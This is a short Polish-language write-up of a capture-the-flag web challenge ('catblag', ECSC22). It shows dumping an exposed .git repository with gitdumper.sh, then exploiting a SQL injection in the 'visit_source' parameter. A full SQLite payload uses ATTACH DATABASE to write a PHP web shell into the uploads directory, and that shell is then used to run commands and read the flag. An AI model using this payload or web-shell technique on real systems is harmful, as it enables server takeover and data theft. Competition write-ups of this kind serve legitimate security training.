![](../images/Pasted%20image%2020220717183110.png)

Komentarz na stronie z podpowiedzią:
![](../images/Pasted%20image%2020220717185843.png)

`/.git/` -> 403 - pobieranie repo przy użyciu https://github.com/internetwache/GitTools

`Dumper/gitdumper.sh https://catblag.ecsc22.hack.cert.pl/.git/ catblag_repo`

Z pobranego repozytorium można odczytać source code, w linii 48 jest SQL Injection (visitRef to parametr `visit_source`)
![](../images/Pasted%20image%2020220717191351.png)

Payload do stworzenia execa:
```
'); ATTACH DATABASE '/var/www/html/uploads/exec.php' AS exec; CREATE TABLE exec.pwn (data text); INSERT INTO exec.pwn (data) VALUES ("<?php system($_GET['a']); ?>"); -- 
```

Potem wykonanie komend na serwerze:
`/uploads/exec.php?a=cat%20../this-is-the-flag-but-with-an-unpredictable-name.txt`

![](../images/Pasted%20image%2020220717195222.png)